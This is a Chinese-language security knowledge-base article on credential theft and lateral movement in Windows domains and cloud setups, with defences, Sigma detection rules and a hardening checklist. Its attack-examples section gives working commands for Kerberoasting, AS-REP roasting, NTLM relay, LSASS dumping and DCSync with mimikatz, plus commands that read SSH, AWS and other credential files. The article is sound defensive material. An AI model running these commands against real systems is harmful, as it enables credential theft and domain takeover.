# 凭据窃取与横向移动 (Credential Theft & Lateral Movement)

> 分类：身份攻击 / 内网 | 风险：严重 | MITRE TA0006 / TA0008 | 攻击链：凭据访问 → 横向

## 1. 攻击原理

拿到第一台主机后，攻击者的目标是**收集更多凭据**，用合法身份在内网移动（Living off the Land），直到控制高价值资产（域控、数据库、备份、财务）。

| 技术 | 目标 | 说明 |
|---|---|---|
| LSASS 转储 | Windows 本地/域凭据 | `mimikatz sekurlsa::logonpasswords` |
| SAM/NTDS | 本地哈希 / 域哈希 | 离线破解或 Pass-the-Hash |
| Kerberoasting | 服务账号 | 请求 SPN 票据，离线破解服务账号口令 |
| AS-REP Roasting | 无需预认证账号 | 直接获取可离线破解的哈希 |
| Golden Ticket | 域控 | 伪造 TGT，长期冒充任意用户 |
| Silver Ticket | 单服务 | 伪造服务票据，绕过域控 |
| DCSync | 域控 | 伪装域控同步，导出全部哈希 |
| NTLM Relay | 中间人 | 中继 NTLM 认证到其他服务 |
| Pass-the-Hash | 横向 | 用哈希直接认证，无需明文 |
| Pass-the-Ticket | 横向 | 导入票据复用会话 |
| LLMNR/NBT-NS 投毒 | 凭据捕获 | Responder 伪装名称解析，收 NTLMv2 |
| 凭据文件 | 各类 | `.ssh/id_rsa`、`.aws/credentials`、`.kube/config`、`.git-credentials`、浏览器保存密码、Keychain |
| Cookie/Token 窃取 | Web/云 | Infostealer 直接接管已认证会话（见 `42`） |

横向常用协议：SMB、WMI、WinRM、RDP、SSH、PsExec、远程计划任务、云 API。

## 2. 攻击示例

### 2.1 Kerberoasting

```bash
# 请求所有 SPN 对应的 Kerberos 票据
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.10 -request
# 离线破解
hashcat -m 13100 hashes.txt rockyou.txt
```

### 2.2 AS-REP Roasting

```bash
impacket-GetNPUsers corp.local/ -dc-ip 10.0.0.10 -usersfile users.txt -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```

### 2.3 NTLM Relay

```bash
# 1. 投毒，诱导受害主机向攻击者认证
responder -I eth0 -wv
# 2. 中继到未强制签名的 SMB / LDAP
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### 2.4 LSASS 转储（需管理员）

```powershell
# 仅授权测试
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 或 mimikatz
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

### 2.5 凭据文件速查

```bash
# 攻击者落地后第一批命令
cat ~/.ssh/id_rsa ~/.ssh/config ~/.aws/credentials ~/.kube/config ~/.docker/config.json
cat ~/.git-credentials ~/.npmrc ~/.pypirc
ls ~/Library/Application\ Support/Google/Chrome/Default/
```

### 2.6 云凭据

```bash
# 从环境变量/元数据/CLI 配置获取长期 AK
env | grep -i -E 'aws|azure|gcp|token'
cat ~/.aws/credentials
# 再用 STS 探测权限
aws sts get-caller-identity
```

## 3. 影响

- 单机失守升级为**全域失守**
- 域控被拿下 → 可下发勒索软件、创建后门账号
- 云账号被接管 → 数据与资源被控制
- 合法身份操作，日志看起来「正常」，难以发现

## 4. 防御措施

1. **凭据保护**
   - Windows：Credential Guard、LSA 保护、禁用 WDigest 明文缓存
   - 禁用 NTLM（或至少审计后逐步禁用）、禁用 RC4
   - 本地管理员密码随机化（LAPS）
   - 服务账号用 gMSA / 托管身份，避免长期口令
2. **管理员分层（Tier Model）**
   - Tier 0（域控/云根）凭据绝不在普通终端登录
   - 使用 PAW（特权访问工作站）/ 跳板机
   - 管理账号与日常账号分离
3. **最小权限**
   - 取消不必要的域管理员、本地管理员
   - 服务账号最小权限，禁止交互登录
   - 云侧用短期凭据 + OIDC，禁用长期 AK
4. **协议加固**
   - SMB 签名 + 加密、LDAP signing + channel binding（EPA）
   - 禁用 LLMNR / NBT-NS / mDNS，减少投毒面
   - 限制 RDP/WinRM/SMB 横向，网络分段
5. **账号卫生**
   - 禁止弱口令与口令复用，服务账号高熵
   - 禁用「无需预认证」的账号（或设置强口令）
   - 定期清理长期未用账号、过期 SPN
6. **检测**
   - 事件：4768/4769（Kerberos）、4624/4625、4672、4688（进程）、7045（服务安装）
   - 规则：批量 SPN 请求、异常 DCSync、LSASS 访问、NTLM 中继特征、单账号多主机登录
   - 蜜罐账号/蜜罐 SPN，触发即告警
7. **终端与凭据隔离**
   - 浏览器与系统凭据分离；密码管理器代替浏览器保存
   - 禁止在脚本/配置中硬编码凭据（用 Secrets Manager）
8. **响应**
   - 凭据泄露按「全量轮换」处理：本地管理员、服务账号、krbtgt（两次）、云 AK、SSH key、应用密钥

## 5. 配置与检测对比

```powershell
# ✅ Windows 加固（GPO/Intune）
# 禁用 NTLM 出站（审计后再强制）
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel -Value 5
# 禁用 WDigest 明文
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -Value 0
# 启用 Credential Guard（需硬件支持，通过 GPO）
# 禁用 LLMNR
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast -Value 0
```

```yaml
# ✅ SMB / LDAP 加固
SMB signing: required
SMB encryption: enabled
LDAP server signing: required
LDAP channel binding: required
```

```yaml
# ✅ 检测：Kerberoasting 批量 SPN 请求
title: Potential Kerberoasting
logsource: { product: windows, service: security }
detection:
  sel:
    EventID: 4769
    TicketEncryptionType: '0x17'      # RC4
    TicketOptions: '0x40810000'
  timeframe: 5m
  condition: sel | count() by TargetUserName > 10
level: high
```

```yaml
# ✅ 检测：DCSync（非域控主机发起复制）
title: DCSync From Non-DC
logsource: { product: windows, service: security }
detection:
  sel:
    EventID: 4662
    Properties|contains: '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
  filter:
    SubjectUserName|endswith: '$'
  condition: sel and not filter
level: critical
```

```bash
# ✅ 凭据泄露后的轮换清单
# 1. 本地管理员口令（LAPS 重置）
# 2. 服务账号口令 / gMSA 轮换
# 3. krbtgt 重置两次（间隔 ≥ 10 小时）
# 4. 云 AK/SK 禁用并新建
# 5. SSH authorized_keys 清理、主机密钥轮换
# 6. 应用密钥、数据库口令、CI Secrets 全部轮换
```

## 6. 自查清单

- [ ] Windows 启用 Credential Guard / LSA 保护，禁用 WDigest 明文
- [ ] NTLM 已审计并逐步禁用，RC4 禁用
- [ ] 本地管理员使用 LAPS，服务账号用 gMSA
- [ ] 管理员分层，Tier 0 凭据不在普通终端使用
- [ ] SMB 签名/加密、LDAP signing/EPA 已启用
- [ ] LLMNR / NBT-NS / mDNS 已禁用
- [ ] 网络分段，限制 SMB/RDP/WinRM 横向
- [ ] 云侧无长期 AK，使用 OIDC 短期凭据
- [ ] 有 Kerberoasting / DCSync / LSASS 访问检测
- [ ] 蜜罐账号/SPN 已部署
- [ ] 凭据泄露后全量轮换预案可执行

## 7. 参考资料

- MITRE ATT&CK TA0006 Credential Access / TA0008 Lateral Movement
- Microsoft: Detecting and mitigating Kerberoasting / DCSync
- NSA/CISA: Top Ten Cybersecurity Misconfigurations
- 关联本库：`14-brute-force`、`42-account-takeover`、`48-malware`、`50-cloud-container`
